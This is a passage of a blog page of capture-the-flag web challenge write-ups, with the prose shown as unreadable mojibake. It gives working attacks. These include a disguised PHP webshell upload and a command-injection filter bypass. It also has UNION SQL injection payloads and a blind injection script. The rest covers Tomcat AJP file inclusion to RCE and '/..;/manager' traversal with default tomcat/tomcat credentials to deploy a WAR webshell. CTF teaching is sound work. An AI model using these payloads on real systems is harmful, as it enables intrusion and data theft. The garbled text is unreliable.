ç½‘ç«™çš„ä¸€ä¸ªç²˜è´´ä»£ç çš„åœ°æ–¹ï¼Œç›¸ä¿¡æ–°ç”Ÿå­¦cè¯­è¨€çš„æ—¶å€™æ²¡å°‘ç”¨ã€‚ã€‚ã€‚æ‰€ä»¥å¾ˆå®¹æ˜“çŒœå‡ºæ¥ï¼Œåˆæ˜¯æ’åˆ—ç»„åˆï¼Œæœ€å¤š6æ¬¡ï¼Œå»åˆ°ç½‘ç«™åå¾—åˆ°ä¸€ä¸²base64ï¼Œè§£ç å¾—flag</p><h2 id="CV-Maker-43-solves"><a href="#CV-Maker-43-solves" class="headerlink" title="CV Maker - 43 solves"></a>CV Maker - 43 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>è¿™é¢˜å…¶å®æ˜¯æœ‰ç‚¹é—®é¢˜ï¼Œä»£ç å†™å¾—ä¸å¤ªå¥½ï¼Œä¸€å¼€å§‹åœ¨çº ç»“è¿‡æ»¤ <code>ph</code> è¿˜æ˜¯ <code>htaccess</code>ï¼Œå°±å…ˆéƒ½å†™ä¸Šå»ï¼Œç»“æœæœ€åå¿˜äº†åˆ ã€‚ã€‚ã€‚æœ€åç›´æ¥phpå°±èƒ½ä¸Šä¼ äº†ï¼Œè°¢è°¢ <code>Y1ng</code> å¸ˆå‚…æŒ‡å‡ºã€‚è€Œä¸”ä¸æ˜¯åŠ¨æ€é¶æœºåº”è¯¥åšä¸€ä¸‹ <code>sandbox</code>ï¼Œå› ä¸ºä¸€å¼€å§‹åªæ˜¯æƒ³ç»™åå‡ ä¸ªäººæ‰“çš„æ²¡æƒ³é‚£ä¹ˆå¤šã€‚ã€‚ã€‚åæ¥è¿˜æ˜¯å¤§æ„äº†ã€‚</p><p>æ‰“å¼€ç•Œé¢å°±æ˜¯ä¸€ä¸ªä¸»é¡µï¼Œè¦æ³¨å†Œä»€ä¹ˆçš„ï¼ˆè¿™é‡Œæ”¾äº†ä¸€ä¸ªå°å½©è›‹ï¼Œä¸çŸ¥é“å¤§å®¶æœ‰æ²¡æœ‰æ³¨æ„åˆ°</p><p><img src="https://s1.ax1x.com/2020/03/30/GnfpnK.png" alt="GnfpnK.png"></p><p>ç„¶åæ³¨å†Œè¿›å»å°±æ˜¯ä¸€ä¸ªä¸ªäººä¿¡æ¯çš„ç•Œé¢ï¼Œè¿™é‡Œéå¸¸è´´å¿ƒçš„æŠŠç½‘ç«™æ‰€æœ‰åŠŸèƒ½å…¨éƒ¨å»æ‰äº†ï¼ŒæŠŠå¤´åƒä¸Šä¼ æ”¾åˆ°äº†æœ€æ˜¾çœ¼çš„åœ°æ–¹ï¼Œé‚£å°±æ˜¯æ–‡ä»¶ä¸Šä¼ äº†ã€‚</p><p>ç„¶åä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œæ›´æ”¹å¤´åƒåå‘ç°f12å¯ä»¥çœ‹åˆ°æ–‡ä»¶è·¯å¾„ï¼Œäºæ˜¯ä¸Šä¼ ä¸€å¥è¯è¯•è¯•ï¼Œå‘ç°éå¸¸è´´å¿ƒåœ°è¿”å›ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/30/GnfRHO.png" alt="GnfRHO.png"></p><p>é‚£å°±æ˜¯ç”¨ exif_imagetype() æ¥æ£€æµ‹æ˜¯ä¸æ˜¯å›¾ç‰‡ï¼Œè¿™ä¸ªå¾ˆç®€å•ï¼Œæ–‡ä»¶å¤´åŠ  <code>GIF89a</code> å°±å¯ä»¥äº†ï¼Œä¸Šä¼ ä¸Šå»åç¼€è¿˜æ˜¯phpï¼Œè¿™é‡Œè®¾ç½®å¾—å¾ˆç®€å•ï¼Œç„¶åèšå‰‘è¿ä¸Šå»ï¼Œå¯ä»¥åœ¨æ ¹ç›®å½•ä¸Šæœ‰flagã€‚</p><p><img src="https://s1.ax1x.com/2020/03/30/Gnf44H.png" alt="Gnf44H.png"></p><p>ä½†æ˜¯æ‰“å¼€ä¸ºç©ºï¼Œè€ƒè™‘æƒé™é—®é¢˜ï¼Œä½†æ˜¯å¾ˆè´´å¿ƒåœ°å‡†å¤‡äº†readflagï¼Œè¿è¡Œå¾—flag</p><p><img src="https://s1.ax1x.com/2020/03/30/Gnfo8A.png" alt="Gnfo8A.png"></p><h2 id="æœ´å®æ— å-24-solves"><a href="#æœ´å®æ— å-24-solves" class="headerlink" title="æœ´å®æ— å - 24 solves"></a>æœ´å®æ— å - 24 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>æ¯ç‡¥çš„ä»£ç å®¡è®¡ï¼Œæ‰“å¼€æ˜¯ä¸€ä¸ª hackmeï¼Œæ³¨æ„åˆ°æ ‡é¢˜æœ‰ <code>äººé—´æä¹bot</code>ï¼Œå¾ˆå®¹æ˜“å°±çŸ¥é“å» <code>robots.txt</code> çœ‹çœ‹ï¼Œå¯ä»¥å¾—åˆ°</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/fAke_f1agggg.php<br></code></pre></td></tr></table></figure><p>è®¿é—®å‘ç°æœ‰ä¸ªå‡flagï¼Œf12çœ‹æŠ¥æ–‡å¯ä»¥å¯Ÿè§‰åˆ°ä¸€ä¸ªå¤´éƒ¨ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/30/GnfICd.png" alt="GnfICd.png"></p><p>äºæ˜¯å°±è¿›å…¥åˆ°æœ±ä¸€æ—¦çš„æ¯ç‡¥é¡µé¢ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯ä»£ç å®¡è®¡äº†ã€‚</p><p><strong>intval</strong></p><p>è¿™ä¸ªæ¯”è¾ƒå¸¸è§äº†ï¼Œ<code>intval()</code> åœ¨å¤„ç†16è¿›åˆ¶æ—¶å­˜åœ¨é—®é¢˜ï¼Œä½†å¼ºåˆ¶è½¬æ¢æ—¶æ˜¯æ­£å¸¸çš„ï¼Œintval(å­—ç¬¦ä¸²)ä¸º0ï¼Œä½†æ˜¯intval(å­—ç¬¦ä¸²+1) ä¼šè‡ªåŠ¨è½¬æ¢æˆæ•°å€¼çš„ï¼Œphp7é‡Œé¢ä¿®å¤äº†è¿™ä¸ªä¸œè¥¿ï¼Œè¿™é‡Œè¾“å…¥ <code>0x1234</code> å³å¯ç»•è¿‡ã€‚</p><p><strong>MD5</strong></p><p>è¿™ä¸ªè€ƒå¯Ÿphpçš„å¼±ç­‰äºï¼Œå½“ä¸¤è¾¹ä¸º0eçš„æ—¶å€™ï¼Œphpä¼šè§£æä¸º0ï¼Œå½“ç„¶ 0e åé¢å¾—æ˜¯æ•°å­—ã€‚</p><p>å†™ä¸ªè„šæœ¬è·‘ä¸ªå‡ åˆ†é’Ÿå°±æœ‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br><span class="hljs-comment">#encoding=utf-8</span><br><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><span class="hljs-keyword">global</span> dict_az<br>dict_az = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>result = <span class="hljs-string">&#x27;0e&#x27;</span><br>result += <span class="hljs-built_in">str</span>(i)<br>i = i + <span class="hljs-number">1</span><br>hashed_s = hashlib.md5(result.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>r = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&#x27;^0e[0-9]&#123;30&#125;&#x27;</span>, hashed_s)<br><span class="hljs-keyword">if</span> r:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] found! md5( &#123;&#125; ) ---&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(result, hashed_s))<br>exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">if</span> i % <span class="hljs-number">1000000</span> == <span class="hljs-number">0</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] current value: &#123;&#125;       &#123;&#125; iterations, continue...&quot;</span>.<span class="hljs-built_in">format</span>(result, <span class="hljs-built_in">str</span>(i)))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br><br><span class="hljs-comment"># 0e215962017</span><br></code></pre></td></tr></table></figure><p><strong>å‘½ä»¤æ‰§è¡Œ</strong></p><p>è¿™é‡Œè¿‡æ»¤äº†ç©ºæ ¼å’Œcatï¼Œç©ºæ ¼çš„è¯ä¸€æœå°±æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ <code>%09</code>ï¼Œ<code>$&#123;IFS&#125;</code>ç­‰ç­‰ï¼Œè¿™é‡Œç”¨ <code>%09</code> ä¸ºä¾‹ï¼Œcatçš„è¯æ¢æˆtacå°±å¯ä»¥äº†ã€‚</p><p>é¦–å…ˆ ls ä¸€ä¸‹çœ‹è§é‚£ä¸ªå·¨å‚»çš„flagåï¼Œç„¶å <code>tac%09flll*</code> å°±å¯ä»¥è¯»åˆ°flagäº†ã€‚</p><h2 id="é¢œå€¼æˆç»©æŸ¥è¯¢-14-solves"><a href="#é¢œå€¼æˆç»©æŸ¥è¯¢-14-solves" class="headerlink" title="é¢œå€¼æˆç»©æŸ¥è¯¢ - 14 solves"></a>é¢œå€¼æˆç»©æŸ¥è¯¢ - 14 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>å¸¸è§„çš„ sql æ³¨å…¥é¢˜ç›®ï¼Œè¿™é‡Œè¿‡æ»¤äº†ç©ºæ ¼å’Œunionï¼ŒåŒæ—¶æ£€æŸ¥äº† UAï¼Œå¸¦ <code>sqlmap</code> çš„å°± dieï¼Œæ‰€ä»¥æ— è„‘ <code>sqlmap</code> æ˜¯ä¸è¡Œçš„ã€‚</p><p>è§£æ³•ï¼šç”¨ <code>/**/</code> ä»£æ›¿ç©ºæ ¼ï¼ŒåŒå†™ union ç»•è¿‡: <code>uniunionon</code></p><p>é¦–å…ˆç”¨order byæŠŠåˆ—æ•°çŒœå‡ºæ¥ï¼Œè¿™é‡Œæ˜¯3ï¼Œunion æŸ¥è¯¢å¿…é¡»åˆ—æ•°ç›¸ç­‰ã€‚</p><p>ç„¶åæŸ¥è¡¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<br>ç»•è¿‡æ–¹å¼å¦‚ä¸Š<br></code></pre></td></tr></table></figure><p>æŸ¥åˆ—</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>flag<br>ç»•è¿‡æ–¹å¼å¦‚ä¸Š<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°flagè¡¨ä¸­æœ‰flagå’Œvalueï¼Œç›´æ¥æŸ¥valueå³å¯ã€‚</p><p>payload: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?stunum<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span>uniounionn<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">value</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag#<br></code></pre></td></tr></table></figure><p>åæ¥å‘ç°å¥½å¤šäººæ˜¯ç›²æ³¨è·‘å‡ºæ¥çš„ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œç»™å‡º <code>Y1ng</code> å¸ˆå‚…çš„ <code>exp</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#é¢–å¥‡L&#x27;Amore www.gem-love.com #è½¬è½½è¯·å‹¿åˆ é™¤æ°´å°</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> *<br>res = <span class="hljs-string">&#x27;&#x27;</span><br>alphabet = [<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;K&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;P&#x27;</span>,<span class="hljs-string">&#x27;Q&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;V&#x27;</span>,<span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;X&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Z&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> alphabet:<br><span class="hljs-comment"># information_schema,ctf</span><br><span class="hljs-comment"># payload = &quot;select/**/group_concat(schema_name)/**/from/**/information_schema.schemata&quot;</span><br><br><span class="hljs-comment">#flag,score</span><br><span class="hljs-comment"># payload = &quot;select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()&quot; </span><br><br><span class="hljs-comment">#flag,value,id,name,score</span><br><span class="hljs-comment"># payload = &#x27;select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()&#x27;</span><br><br><span class="hljs-comment">#wctf2020&#123;e@sy_sq1_and_y0u_sc0re_1t&#125;</span><br>payload = <span class="hljs-string">&quot;select/**/group_concat(value)/**/from/**/flag&quot;</span><br>payload = quote(payload)<br>url=<span class="hljs-string">&#x27;http://101.200.53.102:10114/?stunum=2/(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(payload, i, <span class="hljs-built_in">ord</span>(char))<br>r = requests.get(url)<br><span class="hljs-comment"># print(r.text[2473:2499])</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;666&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>res += char<br><span class="hljs-built_in">print</span>(res)<br><span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="easyweb-23-solves"><a href="#easyweb-23-solves" class="headerlink" title="easyweb - 23 solves"></a>easyweb - 23 solves</h2><blockquote><p>Author: longofo</p></blockquote><p>è¿™ä¸ªé¢˜ç›®è€ƒç‚¹å°±æ˜¯ä¸Šä¸ªæœˆ tomcat çš„ CVEï¼Œä¹Ÿæ˜¯æ¯”èµ›å‰ä¸€å¤©æ‰å†³å®šæ”¾ä¸Šå»çš„ï¼Œä¸€å¼€å§‹æˆ‘åªæƒ³ç€è¯»ä¸ªflagå°±ç®—äº†ï¼Œä½†å­¦é•¿è§‰å¾—ç›´æ¥è¯»å¤ªæ²¡æ„æ€äº†ï¼Œäº‹å®è¯æ˜ç¡®å®å¦‚æ­¤ã€‚</p><p>è§£é¢˜ï¼šé…åˆä¸Šä¼ æ–‡ä»¶ï¼Œä»»æ„ç±»å‹éƒ½å¯ä»¥ï¼Œç„¶ååˆ©ç”¨ajpåœ¨uriè·¯å¾„å¸¦jspåç¼€æ—¶åŒ…å«ä¸Šä¼ çš„æ–‡ä»¶å¹¶è§£æä¸ºjspï¼Œé€šè¿‡rceï¼Œç”¨å‘½ä»¤findåŒ¹é…flagã€‚</p><p>ä¸€å¼€å§‹æ˜¯æƒ³æç¤ºå…·ä½“æ¼æ´çš„ï¼Œä½†æ˜¯åæ¥å‘ç°æœ‰å‡ ä¸ªå¸ˆå‚…éƒ½åšå‡ºæ¥äº†å°±è§‰å¾—è¿˜æ˜¯å¯ä»¥çš„ã€‚</p><p>é¦–å…ˆå°±æ˜¯ç”¨ poc è¯»å‘ç°å¯ä»¥è¯»åˆ°</p><p><img src="https://s1.ax1x.com/2020/03/30/GnhPK0.png" alt="GnhPK0.png"></p><p>é¢„æœŸè§£æ˜¯ä¸Šä¼ ä¸€ä¸ªğŸï¼Œæ‰§è¡Œåå›æ˜¾ï¼Œç„¶åé€šè¿‡pocå»è¯»è‡ªå·±çš„ğŸï¼Œä½†æ˜¯å› ä¸ºæ˜¯ä¸´æ—¶å‡ºé¢˜ï¼Œæ‰€ä»¥æœ‰äº†ä¸€äº›éé¢„æœŸè§£ï¼Œæœ‰å¸ˆå‚…æ‰¾åˆ°æˆ‘è¯´è¯» <code>/home/tomajp/.bashrc_history</code> å¯ä»¥è¯»åˆ°flagçš„ä½ç½®ã€‚ã€‚ã€‚è¿™ä¸ªæ˜¯çœŸçš„æ²¡æƒ³åˆ°</p><p>ä¸‹é¢æ˜¯é¢„æœŸè§£è§£æ³•ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/30/GnhAVU.png" alt="GnhAVU.png"></p><p>ç„¶åç”¨pocè¯»å‘½ä»¤ï¼Œæœ¬åœ°æµ‹è¯• <code>ipconfig</code> ï¼Œå¯ä»¥å¾—åˆ°å›æ˜¾ã€‚</p><p><img src="https://s1.ax1x.com/2020/03/30/GnhFbT.png" alt="GnhFbT.png"></p><p>è¿™æ ·ç›´æ¥æ‰§è¡Œ find å‘½ä»¤æ¥æ‰¾ flag çš„å­—çœ¼ï¼Œå°±å¯ä»¥åœ¨æ ¹ç›®å½•ä¸Šæ‰¾åˆ°æœ‰ä¸€ä¸ªå« <code>flaaaag</code> çš„ç›®å½•ï¼Œç›®å½•é‡Œé¢æœ‰ä¸€ä¸ª <code>what_you_want</code> çš„æ–‡ä»¶ï¼Œæ‰§è¡Œå‘½ä»¤ <code>cat /flaaaag/what_you_want</code> å³å¯è¯»åˆ°flagã€‚</p><h2 id="train-yourself-to-be-godly-1-solves"><a href="#train-yourself-to-be-godly-1-solves" class="headerlink" title="train yourself to be godly - 1 solves"></a>train yourself to be godly - 1 solves</h2><blockquote><p>Author: longofo</p></blockquote><p>é¡µé¢æ˜¯ examplesï¼Œå…¶å®æ´ä¸åœ¨è¿™é‡Œï¼Œå¥½åƒä¸€èˆ¬äººå¾ˆéš¾æƒ³å¾—åˆ°ï¼Œè‚¯å®šå¾—éœ€è¦ hintï¼Œäºæ˜¯å°±æœ‰äº† Orange å¤§å“¥åœ¨ BlackHat ä¸Šçš„ä¸€ä¸ªè®®é¢˜ï¼Œå°±æ˜¯é‚£ä¸ª pdfï¼Œä¸»è¦å†…å®¹å°±æ˜¯URLè·¯å¾„å‚æ•°ä¸è§„èŒƒå¼•å‘çš„é—®é¢˜ï¼Œèƒ½é€ æˆçš„å±å®³å¦‚ä¸‹</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn4CJH.png" alt="Gn4CJH.png"></p><p>apacheä¸­çš„<code>tomcat/webapps</code>ç›®å½•å¦‚ä¸‹ã€‚</p><p>æ—¢ç„¶é¢˜ç›®æ˜¯ç”¨äº†examplesç›®å½•ä½œä¸ºç½‘ç«™æ ¹ç›®å½•ï¼Œé‚£ä¹ˆä¸Šå›¾ä¸­çš„Webå®¹å™¨æ§åˆ¶å°å’Œç®¡ç†ç•Œé¢è¿™ä¸€ç‚¹å°±æ˜¾å¾—å¾ˆæœ‰æ„æ€äº†</p><p><img src="https://s1.ax1x.com/2020/03/30/GnhzdO.png" alt="GnhzdO.png"></p><p>manageç›®å½•æ˜¯å¯ä»¥ä¸Šä¼ WARæ–‡ä»¶éƒ¨ç½²æœåŠ¡ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡manageç›®å½•å®ç°æ–‡ä»¶ä¸Šä¼ ï¼Œç»§è€Œå®ç°æœ¨é©¬ä¸Šä¼ ï¼Œä¹Ÿå°±æ˜¯ç¬¬äºŒä¸ªhintã€‚</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn4FSA.png" alt="Gn4FSA.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° pdf æœ‰ä¸€ä¸ªè¿™æ ·çš„ä¸œè¥¿ï¼Œå‘Šè¯‰æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>/..;/manager/html</code> è¿›å…¥åˆ°manageré¡µé¢ã€‚</p><p>å¹¶ä¸”éšä¾¿åŠ ä¸€ä¸²è·¯å¾„ï¼Œæ ¹æ®æŠ¥é”™ä¿¡æ¯çŸ¥é“æˆ‘ä»¬å½“å‰çš„tomcatçš„rootè·¯å¾„ä¸ºexamlpes</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn49Fe.png" alt="Gn49Fe.png"></p><p>ç›®å½•ç©¿è¶Šåˆ° manager å¾—è¾“å…¥å¯†ç éªŒè¯ï¼Œè¿™é‡Œæ˜¯å¼±å¯†ç  <code>tomcat/tomcat</code> </p><p><img src="https://s1.ax1x.com/2020/03/30/Gn43yq.png" alt="Gn43yq.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯ä¸Šä¼  war åŒ…æ‹¿ webshellï¼ŒgithubæŒ‘ä¸€ä¸ªå°±å¥½äº†ï¼Œè¿™é‡Œç”¨ LandGrey çš„ã€‚</p><p>å¯ä»¥ç›´æ¥ç”¨<code>jar cvf yourname.war webshell.jsp</code>å‘½ä»¤å°†webshell.jspæ‰“åŒ…æˆwar</p><p>é€‰æ‹©æ–‡ä»¶ï¼Œä¸Šä¼ ã€‚</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn41ln.png" alt="Gn41ln.png"></p><p>æ ¹æ®æŠ¥é”™ä¿¡æ¯æ˜æ˜¾è·¯å¾„æ‹¼ç»“å®Œæ˜¯example&#x2F;manager&#x2F;html&#x2F;uploadï¼Œç¼ºå°‘ä¸€ä¸ª&#x2F;..;&#x2F;ï¼ŒåŠ ä¸€ä¸ªå†è¯•</p><p>è¿”å›ä¸€ä¸ª403ï¼Œè¿™è¯´æ˜&#x2F;manager&#x2F;html&#x2F;uploadè·¯å¾„è®¿é—®åˆ°äº†ï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿï¼Œé‚£ä¸€èˆ¬é—®é¢˜å°±å‡ºåœ¨cookieæˆ–è€…sessionæ²¡ç»™ï¼Œwwwæ²¡æœ‰ç›®å½•è®¿é—®æƒé™èº«ä¸Šã€‚æŒ‰ç…§ç›®å‰çš„æ€è·¯æ¥è¯´ï¼Œä¸ä¼šå‡ºç°æœåŠ¡å™¨æƒé™ä¸è¶³çš„é—®é¢˜ï¼Œé‚£å°±åªèƒ½æ˜¯cookieæ²¡æ·»ã€‚åˆ©ç”¨burpsuitä»å¤´å¼€å§‹æŠ“åŒ…ï¼Œåœ¨è®¿é—®<code>/..;/manager/html</code>å‡ºç°äº†Set-Cookie(set-Cookieçš„Pathæ˜¯æŒ‡æ­¤cookieåªåœ¨Pathç›®å½•ä¸‹èµ·ä½œç”¨)ï¼Œé‚£ä¹ˆæˆ‘ä»¬403çš„é—®é¢˜å°±è¿åˆƒè€Œè§£ï¼Œåªéœ€è¦å°†&#x2F;exampleæ¢æˆPathå‚æ•°æŒ‡å®šçš„&#x2F;manageå°±è¡Œï¼Œå†æŠŠcookieåŠ ä¸Šå°±å®Œäº‹äº†ã€‚</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn4lSs.png" alt="Gn4lSs.png"></p><p>ä¿®æ”¹postï¼Œæ·»åŠ cookieï¼ˆps: ç”±äºcookieåªèƒ½ç”¨ä¸€æ¬¡ï¼Œæ‰€ä»¥è¿˜æ˜¯403çš„è¯ï¼Œå†è¯·æ±‚ä¸€æ¬¡<code>/..;/manager/html</code>ï¼Œæ›´æ¢æ–°çš„cookieå°±è¡Œäº† ï¼‰ï¼Œä¸Šä¼ å®Œæ¯•åå¯ä»¥çœ‹åˆ°warå·²å®‰è£…å¥½äº†ï¼Œè®¿é—®ä¸Šä¼ çš„warï¼Œæ³¨æ„è¿™é‡Œè¿˜æœ‰ä¸€ä¸ª<code>/..;/</code>çš„å‘ï¼Œå‰©ä¸‹çš„å°±æ˜¯æ ¹æ®è‡ªå·±çš„é©¬æ‰¾flagäº†ã€‚</p><p>å½“ç„¶ç›´æ¥æ‰¾flagæ˜¯æ‰¾ä¸åˆ°çš„ï¼Œè¿™é“é¢˜æˆ‘æ”¹å¾—æ¯”è¾ƒç„å­¦ï¼ŒåŠ äº†ã€Šåœ£ç»ã€‹æ–°çº¦ï¼šã€Šææ‘©å¤ªåä¹¦ã€‹é‡Œçš„æ–‡ç« ã€‚ï¼ˆé€ƒ</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn4MWj.png" alt="Gn4MWj.png"></p><p><img 